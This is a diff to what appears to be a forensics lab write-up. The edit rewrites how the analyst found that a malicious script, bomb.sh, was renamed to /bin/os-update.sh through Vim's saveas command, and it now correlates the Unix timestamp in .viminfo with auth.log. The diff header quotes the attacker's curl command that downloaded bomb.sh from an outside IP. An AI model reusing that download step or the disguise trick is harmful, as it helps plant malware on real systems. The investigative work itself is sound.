@@ -144,18 +144,19 @@ curl 10.10.158.38:8080/bomb.sh --output bomb.sh
 ### 7. The file was renamed and moved to a different directory. What is the full path of this file now?
 
 #### Method
-Since the file `bomb.sh` was deleted from the initial location, I investigated whether it had been moved or renamed before removal. 
-1. Following the lead that the file was opened with `vi`, I checked the `.viminfo` file in the `/home/it-admin` directory.
-2. The `.viminfo` file stores command-line history and actions performed within the Vim editor.
-3. I discovered a `saveas` command in the history: `saveas /bin/os-update.sh`.
-4. This confirms the attacker attempted to disguise the malicious script as a legitimate system update utility by moving it to a critical system directory (`/bin/`).
+Since the file `bomb.sh` was deleted from its initial location, I investigated whether the attacker had moved or renamed it using the editor's internal commands. 
+
+1. I inspected the `.viminfo` file in `/home/it-admin/`. This file acts as a forensic artifact, storing the history of commands executed within the Vim editor.
+2. I discovered the following entry: `|2,0,1672208983,,"saveas /bin/os-update.sh"`.
+3. **Forensic Correlation:** To confirm this action was related to `bomb.sh`, I analyzed the Unix timestamp `1672208983` (Dec 28, 06:29:43). This is exactly 29 seconds after the `auth.log` recorded the opening of `bomb.sh` (06:29:14).
+4. This sub-minute correlation proves that the attacker used the `saveas` function inside Vim to disguise the malicious script as a legitimate system utility in the `/bin/` directory.
 
 **Command used to inspect Vim history:**
 `cat /home/it-admin/.viminfo`
 
 **Screenshot:**
 
-<img width="636" height="867" alt="image" src="https://github.com/user-attachments/assets/981ee835-c1e6-40e4-8a9e-cb7703b96cb9" />
+<img width="779" height="869" alt="image" src="https://github.com/user-attachments/assets/aaf0e037-c39d-45f8-8776-03cde74a7f01" />
 
 
 #### Answer
